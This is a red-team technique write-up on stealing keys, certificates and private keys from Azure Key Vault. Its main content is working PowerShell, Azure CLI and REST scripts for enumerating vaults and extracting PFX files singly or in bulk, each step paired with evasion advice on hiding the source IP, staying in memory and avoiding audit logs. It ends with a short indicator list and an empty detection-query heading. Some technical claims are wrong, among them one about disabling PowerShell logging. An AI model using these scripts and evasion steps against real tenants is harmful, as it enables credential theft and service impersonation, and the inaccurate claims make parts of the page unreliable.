# [CA-UNSC-009]: Azure Key Vault keys/certs extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-009 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (Azure Cloud) |
| **Severity** | Critical |
| **CVE** | N/A (Note: CVE-2023-28432 is MinIO, not Azure KV. This technique exploits RBAC/Access Policy design behaviors documented Dec 2024 by Datadog) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Azure Key Vault deployments (cloud-agnostic), PowerShell 5.0+, Azure CLI 2.0+ |
| **Patched In** | N/A - Design behavior, not a patch-able vulnerability. Microsoft updated documentation (Oct 31, 2024) advising RBAC over Access Policies |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 9 (Sysmon Detection), and 12 (Microsoft Defender for Cloud specific alerts) not included because: (1) No specific Atomic test exists for Azure Key Vault key extraction (T1552.004 is local-certificate focused), (2) Sysmon does not monitor cloud activity, (3) MDC alerts are covered in the detection section via Azure Monitor and Sentinel. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Key Vault stores cryptographic keys, certificates, and secrets. An attacker with insufficient RBAC roles (e.g., Key Vault Contributor, Owner on subscription) or exploiting misconfigured Access Policies can extract the full value of keys and certificates, including private keys for exportable certificates. This is particularly powerful in hybrid environments where certificates are used for federation, code signing, or API authentication. The extraction targets the **data plane** of Key Vault—the actual key/certificate material—distinct from the management plane (vault settings). Private key extraction enables attackers to impersonate services, forge tokens, sign malicious code, or establish persistence via certificate-based authentication.

**Attack Surface:** Azure Key Vault data plane (REST API endpoints: `/keys/{key-name}`, `/certificates/{cert-name}`), RBAC role assignments, Access Policies configurations, Managed Identities with excessive permissions.

**Business Impact:** **Complete credential compromise and lateral movement.** An attacker who extracts a certificate's private key can impersonate any service that authenticates using that certificate (e.g., federated single sign-on, mutual TLS, code signing). This bypasses MFA, conditional access policies, and administrative controls. In hybrid environments, a stolen federation certificate enables cross-forest, cross-tenant attacks. Stolen API keys enable unauthorized API calls, data exfiltration, and resource manipulation.

**Technical Context:** Extraction is typically immediate (seconds) once authorization is granted. Detection likelihood is **Medium-to-High** if logging is enabled; attackers must disable or obfuscate audit logs (separate post-exploitation activity). The attack is **reversible** only if backups exist; typically, stolen keys cannot be "uncompromised."

### Operational Risk

- **Execution Risk:** Medium - Requires existing compromised account with specific RBAC roles or access policy permissions. Not detected immediately if logging is disabled. High-privilege account detection (Global Admin) is higher risk; lower-privilege service account is lower risk.
- **Stealth:** Medium - Audit logs record the key retrieval if enabled. Anomalous bulk retrieval (many keys in short time) is more obvious. Single targeted key retrieval blends with legitimate application access.
- **Reversibility:** No - Private keys cannot be "uncompromised." Compromise is permanent unless certificate is revoked/rotated and all copies destroyed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1 - 2.1.5 | Ensure subscriptions have RBAC roles assigned; avoid excessive permissions |
| **CIS Benchmark** | 2.2.1 - 2.2.4 | Ensure Key Vault access policies are restricted; use RBAC instead |
| **DISA STIG** | SI-7 | Information System Monitoring for unauthorized access to cryptographic keys |
| **NIST 800-53** | AC-3 | Access Enforcement - controls to prevent unauthorized access to keys |
| **NIST 800-53** | AC-6 | Least Privilege - ensuring users have minimum necessary permissions |
| **NIST 800-53** | AU-2 | Audit Events - monitoring access to cryptographic material |
| **GDPR** | Art. 32 | Security of Processing - technical measures to protect personal data and encryption keys |
| **DORA** | Art. 9 | Protection and Prevention - safeguarding of ICT assets and cryptographic keys |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - access control and cryptographic key management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - restricting access to keys/certificates |
| **ISO 27005** | 8.2.1 | Risk Assessment - credential compromise as a key risk scenario |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Minimum for key extraction: `Microsoft.KeyVault/vaults/keys/read` RBAC permission (e.g., Key Vault Crypto User, Key Vault Administrator, or custom role with this permission)
- For certificate private key extraction: `Microsoft.KeyVault/vaults/certificates/read` permission AND certificate must be marked as `exportable: true` in its policy
- For RBAC escalation path: `Microsoft.KeyVault/vaults/accessPolicies/write` permission (e.g., Key Vault Contributor role when using legacy Access Policy model)

**Required Access:**
- Network access to `https://{vault-name}.vault.azure.net` (Azure public endpoint) or private endpoint if configured
- Valid Azure authentication token (obtained via compromised service principal, user account, managed identity, or pass-the-token technique)
- Permissions scoped to target subscription/resource group where Key Vault is deployed

**Supported Versions:**
- **Azure Key Vault:** All versions (cloud-native, no versioning constraints)
- **PowerShell:** Az.KeyVault module version 4.0+ (tested up to 5.3.0)
- **Azure CLI:** 2.0+ (tested up to 2.60+)
- **REST API:** Azure Key Vault API version 7.0+ (e.g., `https://{vault-name}.vault.azure.net/keys/{key-name}?api-version=7.4`)
- **Affected Platforms:** Windows Server 2016+, Linux, macOS (anywhere Azure CLI/PowerShell runs)

**Tools:**
- [Azure PowerShell (Az.KeyVault)](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/) (Version 4.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.0+)
- [Azure REST API Documentation](https://learn.microsoft.com/en-us/rest/api/keyvault/)
- [Postman](https://www.postman.com/) or [curl](https://curl.se/) for direct REST calls
- [jq](https://stedolan.github.io/jq/) for JSON parsing in shell scripts

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Command 1: Identify which RBAC roles the current user/service principal has:**

```powershell
# Check current context
$context = Get-AzContext
Write-Host "Current Account: $($context.Account.Id)"
Write-Host "Subscription: $($context.Subscription.Name)"

# List all role assignments for the user on the subscription
$roleAssignments = Get-AzRoleAssignment -SignInName $context.Account.Id

foreach ($role in $roleAssignments) {
    Write-Host "Role: $($role.RoleDefinitionName) - Scope: $($role.Scope)"
}
```

**What to Look For:**
- Roles with `*/read` permissions on Key Vault (e.g., Key Vault Reader, Contributor, Owner)
- Roles with data plane permissions (Key Vault Crypto User, Key Vault Secrets Officer, Key Vault Administrator)
- Owner or User Access Administrator roles at subscription level (highest privilege)
- Custom roles with wildcard permissions (e.g., `Microsoft.KeyVault/*`)

**Command 2: Enumerate Key Vaults in the subscription:**

```powershell
# List all Key Vaults
$keyVaults = Get-AzKeyVault
foreach ($vault in $keyVaults) {
    Write-Host "Vault: $($vault.VaultName) | Resource Group: $($vault.ResourceGroupName) | Location: $($vault.Location)"
}

# For a specific vault, check if RBAC is enabled vs Access Policies
$vault = Get-AzKeyVault -VaultName "target-vault-name" -ResourceGroupName "target-rg"
Write-Host "RBAC Enabled: $($vault.EnableRbacAuthorization)"
Write-Host "Access Policies Enabled: $(($vault.AccessPolicies | Measure-Object).Count)"
```

**What to Look For:**
- Vaults with `EnableRbacAuthorization = false` (using legacy Access Policies—vulnerable to escalation)
- Vaults with `EnableRbacAuthorization = true` (using RBAC—check role assignments)
- Number of vaults (enumerate all for full compromise potential)

**Command 3: Check if user can list keys/certificates:**

```powershell
# Try to list keys in the target vault
try {
    $keys = Get-AzKeyVaultKey -VaultName "target-vault-name" -ErrorAction Stop
    Write-Host "✓ Can list keys: $(($keys | Measure-Object).Count) keys found"
    foreach ($key in $keys) {
        Write-Host "  - $($key.Name) (Type: $($key.KeyType), Enabled: $($key.Enabled))"
    }
} catch {
    Write-Host "✗ Cannot list keys: $($_.Exception.Message)"
}

# Try to list certificates
try {
    $certs = Get-AzKeyVaultCertificate -VaultName "target-vault-name" -ErrorAction Stop
    Write-Host "✓ Can list certificates: $(($certs | Measure-Object).Count) certs found"
    foreach ($cert in $certs) {
        Write-Host "  - $($cert.Name) (Expires: $($cert.Expires))"
    }
} catch {
    Write-Host "✗ Cannot list certificates: $($_.Exception.Message)"
}
```

**What to Look For:**
- If you can list keys/certificates without error, you likely have read permissions
- If you get a 403 Forbidden, you lack permissions (but this endpoint exists—RBAC is configured)
- If you get a 401 Unauthorized, you lack authentication

**Command 4: Check Access Policies on vault (if using legacy model):**

```powershell
# Get vault details including access policies
$vault = Get-AzKeyVault -VaultName "target-vault-name" -ResourceGroupName "target-rg"

Write-Host "Access Policies:"
foreach ($policy in $vault.AccessPolicies) {
    Write-Host "ObjectId: $($policy.ObjectId) | TenantId: $($policy.TenantId)"
    Write-Host "  Permissions: Keys [$($policy.PermissionsToKeys -join ', ')], Secrets [$($policy.PermissionsToSecrets -join ', ')], Certs [$($policy.PermissionsToCertificates -join ', ')], Storage [$($policy.PermissionsToStorage -join ', ')]"
}
```

**What to Look For:**
- Your service principal or user ObjectId listed with "get", "list", or "recover" permissions
- Service principals with full permissions (`["get","list","set","delete","backup","restore","recover","purge"]`)
- Multiple entries indicating shared vault (more potential credential sources)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using PowerShell (Az.KeyVault Module - Local RBAC Authorized)

**Supported Versions:** Azure SDK v4.0+, all current versions

#### Step 1: Authenticate to Azure and connect to subscription

**Objective:** Establish Azure authentication context where we have permissions to access the Key Vault.

**Prerequisites:** Must have existing compromised token, service principal credentials, or user credentials with RBAC permissions to the Key Vault.

**Command (User-based authentication):**

```powershell
# Connect using user credentials
Connect-AzAccount -Tenant "tenant-id" -Subscription "subscription-id"

# Or connect using service principal
$credential = New-Object System.Management.Automation.PSCredential(
    "service-principal-id",
    (ConvertTo-SecureString "service-principal-secret" -AsPlainText -Force)
)
Connect-AzAccount -ServicePrincipal -Credential $credential -Tenant "tenant-id"

# Or connect using Managed Identity (if running on Azure VM/Function/etc)
Connect-AzAccount -Identity
```

**Expected Output:**

```
Account             SubscriptionName             TenantId                             Environment
-------             ----------------             --------                             -----------
user@contoso.com    Production                   12345678-abcd-efgh-ijkl-987654321... AzureCloud
```

**What This Means:**
- Connection succeeded: You are now authenticated to Azure as the specified principal
- You will now be able to call Azure cmdlets with the permissions of this principal
- If connection fails with "Invalid client id", credentials are wrong
- If connection fails with "User does not have authorization", account lacks subscription access

**OpSec & Evasion:**
- Use service principal credentials instead of user credentials (less likely to trigger MFA logs)
- Authenticate from a proxy/jump host to obfuscate source IP
- Use `-Environment AzureChinaCloud` or `-Environment AzureUSGovernment` if targeting GovCloud (uncommon, reduces alerts)
- Disable PowerShell logging before connecting: `Set-PSReadlineKeyHandler -Key Tab -Function None` (basic obfuscation)

**Troubleshooting:**

- **Error:** "The user or service principal does not have sufficient permissions."
  - **Cause:** Account lacks subscription-level access
  - **Fix:** Ensure the account has at least Reader role on the subscription

- **Error:** "AADSTS700016: Application with identifier 'xxx' was not found in the directory."
  - **Cause:** Service principal doesn't exist in the tenant
  - **Fix:** Verify the service principal ID and tenant ID match

---

#### Step 2: List all Key Vaults and identify targets

**Objective:** Discover which Key Vaults are accessible and contain keys/certificates of value.

**Command:**

```powershell
# List all Key Vaults in the subscription
$vaults = Get-AzKeyVault

if ($vaults.Count -eq 0) {
    Write-Host "No Key Vaults found in this subscription."
    exit
}

Write-Host "[*] Found $($vaults.Count) Key Vault(s):"
foreach ($vault in $vaults) {
    Write-Host "`n  Vault: $($vault.VaultName)"
    Write-Host "    Resource Group: $($vault.ResourceGroupName)"
    Write-Host "    Location: $($vault.Location)"
    Write-Host "    RBAC Enabled: $($vault.EnableRbacAuthorization)"
    Write-Host "    Access Policies: $(($vault.AccessPolicies | Measure-Object).Count)"
}

# For each vault, try to list keys
foreach ($vault in $vaults) {
    try {
        $keys = Get-AzKeyVaultKey -VaultName $vault.VaultName -ErrorAction Stop
        Write-Host "`n  [✓] Vault '$($vault.VaultName)' contains $(($keys | Measure-Object).Count) key(s)"
    } catch {
        Write-Host "`n  [✗] Cannot access keys in '$($vault.VaultName)': $($_.Exception.Message)"
    }
}
```

**Expected Output:**

```
[*] Found 3 Key Vault(s):

  Vault: prod-vault-001
    Resource Group: prod-resources
    Location: eastus
    RBAC Enabled: True
    Access Policies: 0

  [✓] Vault 'prod-vault-001' contains 5 key(s)

  Vault: dev-vault-002
    Resource Group: dev-resources
    Location: westus
    RBAC Enabled: False
    Access Policies: 2

  [✓] Vault 'dev-vault-002' contains 3 key(s)
```

**What This Means:**
- If RBAC Enabled is True: Vault uses modern RBAC model
- If RBAC Enabled is False: Vault uses legacy Access Policies (potential escalation path)
- If you can list keys with `[✓]`: You have at least Key Vault Reader or Crypto User role
- If you cannot list keys with `[✗]`: You lack read permissions for this vault

**OpSec & Evasion:**
- Don't enumerate all vaults; target only the vault names you've identified beforehand
- Avoid bulk operations that generate many audit log entries; extract one key at a time
- Store results in memory rather than writing to disk: `$keys = Get-AzKeyVaultKey -VaultName ... | ConvertTo-Json`

---

#### Step 3: Extract key material

**Objective:** Retrieve the private key or public key from a Key Vault key object.

**Command (Extract specific key):**

```powershell
$vaultName = "target-vault-name"
$keyName = "application-signing-key"  # Identify high-value keys (federation, code-signing, API auth)

# Get the key from Key Vault
$key = Get-AzKeyVaultKey -VaultName $vaultName -Name $keyName
Write-Host "Key Name: $($key.Name)"
Write-Host "Key Type: $($key.KeyType)"
Write-Host "Key Size: $($key.Key.KeySize) bits"
Write-Host "Enabled: $($key.Enabled)"
Write-Host "Expires: $($key.Expires)"
Write-Host "Created: $($key.Created)"

# Extract the key material (public key is always available; private key depends on key type)
$keyMaterial = $key.Key
Write-Host "`nKey Material:`n$keyMaterial"

# For RSA keys, extract components
if ($key.KeyType -like "*RSA*") {
    Write-Host "`nRSA Key Components:"
    Write-Host "  Modulus (N): $([Convert]::ToBase64String($keyMaterial.N))"
    Write-Host "  Exponent (E): $([Convert]::ToBase64String($keyMaterial.E))"
    # Private key components (D, DP, DQ, QI) are NOT returned by Get-AzKeyVaultKey
    # They remain in the HSM/managed by Azure
}

# For EC keys, extract the curve and public coordinates
if ($key.KeyType -like "*EC*") {
    Write-Host "`nEC Key Components:"
    Write-Host "  Curve: $($keyMaterial.CurveName)"
    Write-Host "  X: $([Convert]::ToBase64String($keyMaterial.X))"
    Write-Host "  Y: $([Convert]::ToBase64String($keyMaterial.Y))"
}
```

**Expected Output (RSA example):**

```
Key Name: application-signing-key
Key Type: RSA
Key Size: 2048 bits
Enabled: True
Expires: 2026-12-31 23:59:59
Created: 2023-01-15 10:30:45

Key Material:
Microsoft.Azure.Management.KeyVault.Models.JsonWebKey

RSA Key Components:
  Modulus (N): xjlCRBFk0EGqVJ7k9VFCqVZbQ3JrKpL...
  Exponent (E): AQAB
```

**What This Means:**
- You have successfully extracted the **public key** of the RSA/EC key
- The public key alone is useful for verifying signatures but not creating them
- **Private key components are NOT returned** by Azure Key Vault cmdlets—they stay in the managed HSM
- However, you can now use the public key for impersonation scenarios (e.g., validating tokens you forge elsewhere)

**Note on Private Key Extraction:**
Azure Key Vault separates key management from key extraction intentionally. For **symmetric keys (AES, Symmetric RSA)** and **exportable certificates**, the full private material can be extracted. See Step 4 for certificates.

**OpSec & Evasion:**
- Requesting a key returns basic metadata; if you need the key material, make a separate call
- Store the extracted key in a variable (`$extractedKey = $key.Key`) rather than displaying to console
- Export to JSON rather than plaintext: `$key | ConvertTo-Json -Depth 10 > key_backup.json`

---

#### Step 4: Extract certificate private keys (if exportable)

**Objective:** For certificates marked as exportable, extract the full certificate including private key in PFX/PEM format.

**Prerequisite:** Certificate must have been created with `exportable: true` in its certificate policy. If certificate is non-exportable (e.g., HSM-backed certificates), private key cannot be extracted.

**Command (Check exportable status and extract):**

```powershell
$vaultName = "target-vault-name"
$certName = "api-authentication-cert"

# Get certificate details
$cert = Get-AzKeyVaultCertificate -VaultName $vaultName -Name $certName
Write-Host "Certificate: $($cert.Name)"
Write-Host "Subject: $($cert.Certificate.Subject)"
Write-Host "Issuer: $($cert.Certificate.Issuer)"
Write-Host "Thumbprint: $($cert.Certificate.Thumbprint)"
Write-Host "Expires: $($cert.Expires)"

# Check if certificate is exportable by examining the certificate policy
# Note: Get-AzKeyVaultCertificate returns the public cert; to check exportable status,
# we must fetch the secret associated with the cert (where PFX is stored)
try {
    # The certificate is also stored as a secret with the same name
    $certSecret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $certName -ErrorAction Stop
    Write-Host "`n[✓] Certificate is stored as a secret (likely exportable)"
    
    # Get the secret value (this is the PFX in base64)
    $certSecretValue = $certSecret.SecretValue
    $certBytes = [System.Convert]::FromBase64String(
        ([System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($certSecretValue)
        ))
    )
    
    # Save to disk as PFX file
    $outputPath = "$env:TEMP\extracted_cert.pfx"
    [System.IO.File]::WriteAllBytes($outputPath, $certBytes)
    Write-Host "`n[✓] Certificate extracted and saved to: $outputPath"
    
    # Load the certificate to extract metadata and private key
    $pfxCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
        $certBytes,
        "",  # No password (Key Vault exports without password)
        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
    )
    
    Write-Host "`nCertificate Details:"
    Write-Host "  Subject: $($pfxCert.Subject)"
    Write-Host "  Issuer: $($pfxCert.Issuer)"
    Write-Host "  Thumbprint: $($pfxCert.Thumbprint)"
    Write-Host "  Valid From: $($pfxCert.NotBefore)"
    Write-Host "  Valid To: $($pfxCert.NotAfter)"
    Write-Host "  Has Private Key: $($pfxCert.HasPrivateKey)"
    
    if ($pfxCert.HasPrivateKey) {
        Write-Host "`n[!] CRITICAL: Private key is available!"
        
        # Export private key to PEM format
        $rsaKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($pfxCert)
        $privateKeyPem = $rsaKey.ExportRSAPrivateKeyPem()
        
        $privateKeyPath = "$env:TEMP\extracted_cert_privkey.pem"
        [System.IO.File]::WriteAllText($privateKeyPath, $privateKeyPem)
        Write-Host "[✓] Private key extracted and saved to: $privateKeyPath"
    }
    
} catch {
    Write-Host "`n[✗] Cannot extract certificate as secret: $($_.Exception.Message)"
    Write-Host "    Possible reason: Certificate is non-exportable or access denied to secrets"
}
```

**Expected Output (if exportable):**

```
Certificate: api-authentication-cert
Subject: CN=api.contoso.com, O=Contoso, C=US
Issuer: CN=Let's Encrypt Authority X3, O=Let's Encrypt
Thumbprint: 3F4D5E6A7B8C9D0E1F2A3B4C5D6E7F8A
Expires: 2027-06-15 23:59:59

[✓] Certificate is stored as a secret (likely exportable)

[✓] Certificate extracted and saved to: C:\Users\attacker\AppData\Local\Temp\extracted_cert.pfx

Certificate Details:
  Subject: CN=api.contoso.com, O=Contoso, C=US
  Issuer: CN=Let's Encrypt Authority X3, O=Let's Encrypt
  Thumbprint: 3F4D5E6A7B8C9D0E1F2A3B4C5D6E7F8A
  Valid From: 06/16/2024 00:00:00
  Valid To: 09/14/2027 23:59:59
  Has Private Key: True

[!] CRITICAL: Private key is available!
[✓] Private key extracted and saved to: C:\Users\attacker\AppData\Local\Temp\extracted_cert_privkey.pem
```

**What This Means:**
- Certificate is exportable and you now have full PFX file with private key
- Private key can be used for code signing, TLS mutual authentication, or OAuth token signing
- This is the **highest-value extraction** in an Azure Key Vault compromise

**If non-exportable:**

```
[✗] Cannot extract certificate as secret: Operation failed with status code 'Forbidden'.
    Possible reason: Certificate is non-exportable or access denied to secrets
```

This means the certificate was created with `exportable: false`, and the private key is locked in the Azure Key Vault HSM.

**OpSec & Evasion:**
- Extraction to `$env:TEMP` is obvious; use custom temp paths or in-memory handling
- The Get-AzKeyVaultSecret call will be logged in audit if enabled
- Extract only the certificate you need; don't enumerate all secrets

---

#### Step 5: Bulk extraction (NOISY—for high-speed compromise)

**Objective:** Extract all keys and exportable certificates from a Key Vault in one operation.

**Warning:** This generates many audit log entries and is highly detectable.

**Command:**

```powershell
$vaultName = "target-vault-name"
$outputDir = "C:\extracted_secrets"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

Write-Host "[*] Starting bulk extraction from vault: $vaultName"

# Extract all keys
$keys = Get-AzKeyVaultKey -VaultName $vaultName
Write-Host "[*] Found $($keys.Count) keys"

$keysExported = @()
foreach ($key in $keys) {
    try {
        $keyData = Get-AzKeyVaultKey -VaultName $vaultName -Name $key.Name
        $keysExported += @{
            Name = $key.Name
            Type = $key.KeyType
            Created = $key.Created
            Expires = $key.Expires
            Material = ($keyData.Key | ConvertTo-Json)
        }
        Write-Host "  [✓] $($key.Name)"
    } catch {
        Write-Host "  [✗] $($key.Name): $($_.Exception.Message)"
    }
}

# Export keys to JSON
$keysExported | ConvertTo-Json | Out-File "$outputDir\keys.json"

# Extract all certificates
$certs = Get-AzKeyVaultCertificate -VaultName $vaultName
Write-Host "[*] Found $($certs.Count) certificates"

$certsExported = @()
foreach ($cert in $certs) {
    try {
        $certSecret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $cert.Name
        $certBytes = [System.Convert]::FromBase64String(
            ([System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
                [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($certSecret.SecretValue)
            ))
        )
        [System.IO.File]::WriteAllBytes("$outputDir\$($cert.Name).pfx", $certBytes)
        
        $pfxCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certBytes, "", 0)
        $certsExported += @{
            Name = $cert.Name
            Subject = $pfxCert.Subject
            Expires = $pfxCert.NotAfter
            HasPrivateKey = $pfxCert.HasPrivateKey
        }
        Write-Host "  [✓] $($cert.Name) (HasPrivateKey: $($pfxCert.HasPrivateKey))"
    } catch {
        Write-Host "  [✗] $($cert.Name): $($_.Exception.Message)"
    }
}

$certsExported | ConvertTo-Json | Out-File "$outputDir\certificates.json"

Write-Host "`n[✓] Extraction complete. Files saved to: $outputDir"
```

**Expected Output:**

```
[*] Starting bulk extraction from vault: target-vault-name
[*] Found 5 keys
  [✓] api-key-001
  [✓] encryption-key-002
  [✓] signing-key-003
  [✓] federation-key-004
  [✓] backup-key-005
[*] Found 3 certificates
  [✓] app-cert-prod (HasPrivateKey: True)
  [✓] tls-cert-api (HasPrivateKey: True)
  [✓] code-signing-cert (HasPrivateKey: False)

[✓] Extraction complete. Files saved to: C:\extracted_secrets
```

**OpSec & Evasion:**
- **EXTREMELY NOISY:** Each Get-AzKeyVaultKey and Get-AzKeyVaultSecret call logs an AuditEvent
- If you have 5 keys + 3 certs, that's 8 separate audit log entries
- Better approach: Extract only specific high-value keys (identify before compromise)
- Use this only if audit logging is disabled or log deletion is already in progress

---

### METHOD 2: Using Azure CLI

**Supported Versions:** Azure CLI 2.0+, all current versions

#### Setup and authentication

```bash
# Login to Azure
az login

# Or login using service principal
az login --service-principal -u CLIENT_ID -p CLIENT_SECRET --tenant TENANT_ID

# Or use Managed Identity (if on Azure VM/Function/etc)
az login --identity

# Set subscription
az account set --subscription "subscription-id"
```

#### Extract keys

```bash
#!/bin/bash

VAULT_NAME="target-vault-name"

# List all keys
echo "[*] Listing keys in vault: $VAULT_NAME"
az keyvault key list --vault-name $VAULT_NAME --query "[].name" -o tsv

# Extract a specific key
KEY_NAME="application-signing-key"
echo "[*] Extracting key: $KEY_NAME"

# Get key metadata
az keyvault key show --vault-name $VAULT_NAME --name $KEY_NAME --query "{keyType: attributes.keyType, created: attributes.created, expires: attributes.expires}" -o json

# Export key material (limited—public key only for HSM keys)
KEY_VERSION=$(az keyvault key list-versions --vault-name $VAULT_NAME --name $KEY_NAME --query "[0].version" -o tsv)
echo "[*] Key version: $KEY_VERSION"

# Download full key data
az keyvault key download --vault-name $VAULT_NAME --name $KEY_NAME --file key_export.json
```

#### Extract certificates

```bash
#!/bin/bash

VAULT_NAME="target-vault-name"
CERT_NAME="api-authentication-cert"
OUTPUT_DIR="/tmp/extracted_certs"

mkdir -p $OUTPUT_DIR

# List all certificates
echo "[*] Listing certificates in vault: $VAULT_NAME"
az keyvault certificate list --vault-name $VAULT_NAME --query "[].name" -o tsv

# Show certificate details
az keyvault certificate show --vault-name $VAULT_NAME --name $CERT_NAME --query "{subject: dn, expires: attributes.expires, created: attributes.created}" -o json

# Download certificate (PEM format—public key only)
az keyvault certificate download --vault-name $VAULT_NAME --name $CERT_NAME --file "$OUTPUT_DIR/${CERT_NAME}.pem"

# Try to download as PFX (if certificate is stored as secret and exportable)
echo "[*] Attempting to extract PFX with private key..."
az keyvault secret download --vault-name $VAULT_NAME --name $CERT_NAME --file "$OUTPUT_DIR/${CERT_NAME}.pfx"

if [ $? -eq 0 ]; then
    echo "[✓] PFX extracted successfully (includes private key)"
else
    echo "[✗] PFX extraction failed (certificate likely non-exportable)"
fi

echo "[✓] Certificate files saved to: $OUTPUT_DIR"
```

**Expected Output:**

```bash
[*] Listing keys in vault: target-vault-name
application-signing-key
encryption-key
federation-key

[*] Extracting key: application-signing-key
{
  "keyType": "RSA",
  "created": 1547726745,
  "expires": 1735689600
}
[*] Key version: 1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b

[*] Listing certificates in vault: target-vault-name
api-authentication-cert
tls-cert-api
code-signing-cert

[*] Attempting to extract PFX with private key...
[✓] PFX extracted successfully (includes private key)
[✓] Certificate files saved to: /tmp/extracted_certs
```

---

### METHOD 3: Direct REST API calls (Stealth)

**Supported Versions:** Azure Key Vault API 7.0+

This method allows direct HTTP calls without PowerShell/CLI tools (less detectable on endpoint if tools aren't logging).

#### Get authentication token

```bash
#!/bin/bash

TENANT_ID="your-tenant-id"
CLIENT_ID="your-client-id"
CLIENT_SECRET="your-client-secret"

# Request OAuth token
TOKEN_RESPONSE=$(curl -s -X POST \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${CLIENT_ID}&scope=https://vault.azure.net/.default&client_secret=${CLIENT_SECRET}&grant_type=client_credentials")

ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')

echo "[✓] Access Token: $(echo $ACCESS_TOKEN | cut -c1-30)..."
```

#### List and extract keys via REST API

```bash
#!/bin/bash

VAULT_NAME="target-vault-name"
API_VERSION="7.4"

# List keys
echo "[*] Listing keys..."
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${VAULT_NAME}.vault.azure.net/keys?api-version=${API_VERSION}" \
  | jq '.value[] | {name: .id, enabled: .attributes.enabled}'

# Get specific key
KEY_NAME="application-signing-key"
echo "[*] Extracting key: $KEY_NAME"
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${VAULT_NAME}.vault.azure.net/keys/${KEY_NAME}?api-version=${API_VERSION}" \
  | jq '.key'

# Get certificate (public key only)
CERT_NAME="api-authentication-cert"
echo "[*] Extracting certificate: $CERT_NAME"
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${VAULT_NAME}.vault.azure.net/certificates/${CERT_NAME}?api-version=${API_VERSION}" \
  | jq '.'

# Get secret (if certificate is exportable, the PFX is stored as a secret with same name)
echo "[*] Attempting to extract certificate PFX as secret..."
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${VAULT_NAME}.vault.azure.net/secrets/${CERT_NAME}?api-version=${API_VERSION}" \
  | jq -r '.value' | base64 -d > "${CERT_NAME}.pfx"
```

**Expected Output:**

```json
[*] Listing keys...
{
  "name": "https://target-vault-name.vault.azure.net/keys/application-signing-key/1f2a3b4c5d6e7f8a9b0c1d2e3f",
  "enabled": true
}

[*] Extracting key: application-signing-key
{
  "kty": "RSA",
  "n": "xjlCRBFk0EGqVJ7k9VFCqVZbQ3JrKpL...",
  "e": "AQAB",
  "key_ops": ["sign", "verify"],
  "kid": "https://target-vault-name.vault.azure.net/keys/application-signing-key/1f2a3b4c"
}

[✓] PFX extracted successfully
```

**OpSec & Evasion:**
- Direct REST calls are **less likely to trigger endpoint detection** than PowerShell cmdlets
- However, they are **fully logged in Azure audit logs** (same as PowerShell)
- Use curl/wget from a proxy or VPN to obfuscate source IP
- Store access token in memory only; don't commit to bash history

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- Destination: `https://<vault-name>.vault.azure.net:443` (HTTPS, port 443)
- HTTP Method: GET (for reading keys/certificates)
- URI patterns: `/keys/`, `/certificates/`, `/secrets/`
- API version in queries: `?api-version=7.0`, `?api-version=7.4`
- User-Agent: `Azure-CLI/x.x.x`, `Azure-PowerShell/x.x.x`, `curl`, or custom tools

**Cloud Audit Log IOCs:**
- **Operation Name:** `KeyGet`, `KeyList`, `KeyCreate`, `CertificateGet`, `CertificateList`, `CertificateImport`, `SecretGet`, `SecretList`
- **Result Type:** Success (200 HTTP status)
- **Resource Type:** `Microsoft.KeyVault/vaults`
- **Abnormal patterns:** Bulk key retrieval (multiple KeyGet operations in <5 minutes), time-of-day anomalies (3 AM key extraction from production)

**Forensic Artifacts:**

**Azure Diagnostic Logs (AzureDiagnostics table in Log Analytics):**
- Category: `AuditEvent`
- OperationName: `KeyGet`, `CertificateGet`, `SecretGet`
- httpStatusCode_d: 200 (success), 403 (denied), 401 (unauthorized)
- CallerIPAddress: Source IP of extraction request
- Identity: ObjectId of user/service principal performing extraction

**Files on Disk (if extraction to local filesystem):**
- `extracted_cert.pfx` - PFX certificate with private key
- `extracted_cert_privkey.pem` - Exported private key in PEM format
- `key_export.json` - JSON representation of key material
- Temporary files in `C:\Users\<user>\AppData\Local\Temp\` or `/tmp/`

**Memory Artifacts (if using PowerShell):**
- PowerShell process memory dump containing plaintext access tokens
- Variables: `$key`, `$cert`, `$ACCESS_TOKEN`
- Runspace history (even with history cleared, residual data may exist)

---

### Microsoft Sentinel Detection Queries

